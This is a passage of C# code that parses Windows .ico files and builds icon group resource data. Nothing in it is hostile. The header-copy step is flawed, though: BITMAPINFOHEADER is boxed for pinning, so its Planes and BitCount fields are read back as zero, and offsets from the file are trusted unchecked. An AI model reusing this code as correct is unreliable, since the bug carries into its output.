                // Read all the bytes from the file.
                byte[] fileBytes = System.IO.File.ReadAllBytes(filename);
                // First struct is an ICONDIR
                // Pin the bytes from the file in memory so that we can read them.
                // If we didn't pin them then they could move around (e.g. when the
                // garbage collector compacts the heap)
                GCHandle pinnedBytes = GCHandle.Alloc(fileBytes, GCHandleType.Pinned);
                // Read the ICONDIR
                instance.iconDir = (ICONDIR)Marshal.PtrToStructure(pinnedBytes.AddrOfPinnedObject(), typeof(ICONDIR));
                // which tells us how many images are in the ico file. For each image, there's a ICONDIRENTRY, and associated pixel data.
                instance.iconEntry = new ICONDIRENTRY[instance.iconDir.Count];
                instance.iconImage = new byte[instance.iconDir.Count][];
                // The first ICONDIRENTRY will be immediately after the ICONDIR, so the offset to it is the size of ICONDIR
                int offset = Marshal.SizeOf(instance.iconDir);
                // After reading an ICONDIRENTRY we step forward by the size of an ICONDIRENTRY            
                var iconDirEntryType = typeof(ICONDIRENTRY);
                var size = Marshal.SizeOf(iconDirEntryType);
                for (int i = 0; i <= instance.iconDir.Count - 1; i++)
                {
                    // Grab the structure.
                    var entry =
                        (ICONDIRENTRY)
                            Marshal.PtrToStructure(new IntPtr(pinnedBytes.AddrOfPinnedObject().ToInt64() + offset),
                                iconDirEntryType);
                    instance.iconEntry[i] = entry;
                    // Grab the associated pixel data.
                    instance.iconImage[i] = new byte[entry.BytesInRes];
                    Buffer.BlockCopy(fileBytes, entry.ImageOffset, instance.iconImage[i], 0, entry.BytesInRes);
                    offset += size;
                }
                pinnedBytes.Free();
                return instance;
            }

            public byte[] CreateIconGroupData(uint iconBaseID)
            {
                // This will store the memory version of the icon.
                int sizeOfIconGroupData = Marshal.SizeOf(typeof(ICONDIR)) +
                                          Marshal.SizeOf(typeof(GRPICONDIRENTRY)) * ImageCount;
                byte[] data = new byte[sizeOfIconGroupData];
                var pinnedData = GCHandle.Alloc(data, GCHandleType.Pinned);
                Marshal.StructureToPtr(iconDir, pinnedData.AddrOfPinnedObject(), false);
                var offset = Marshal.SizeOf(iconDir);
                for (int i = 0; i <= ImageCount - 1; i++)
                {
                    GRPICONDIRENTRY grpEntry = new GRPICONDIRENTRY();
                    BITMAPINFOHEADER bitmapheader = new BITMAPINFOHEADER();
                    var pinnedBitmapInfoHeader = GCHandle.Alloc(bitmapheader, GCHandleType.Pinned);
                    Marshal.Copy(ImageData(i), 0, pinnedBitmapInfoHeader.AddrOfPinnedObject(),
                        Marshal.SizeOf(typeof(BITMAPINFOHEADER)));
                    pinnedBitmapInfoHeader.Free();
                    grpEntry.Width = iconEntry[i].Width;
                    grpEntry.Height = iconEntry[i].Height;
                    grpEntry.ColorCount = iconEntry[i].ColorCount;
                    grpEntry.Reserved = iconEntry[i].Reserved;
                    grpEntry.Planes = bitmapheader.Planes;
                    grpEntry.BitCount = bitmapheader.BitCount;
                    grpEntry.BytesInRes = iconEntry[i].BytesInRes;
                    grpEntry.ID = Convert.ToUInt16(iconBaseID + i);
                    Marshal.StructureToPtr(grpEntry, new IntPtr(pinnedData.AddrOfPinnedObject().ToInt64() + offset),
                        false);
                    offset += Marshal.SizeOf(typeof(GRPICONDIRENTRY));
                }
                pinnedData.Free();
                return data;
            }
        }
    }
}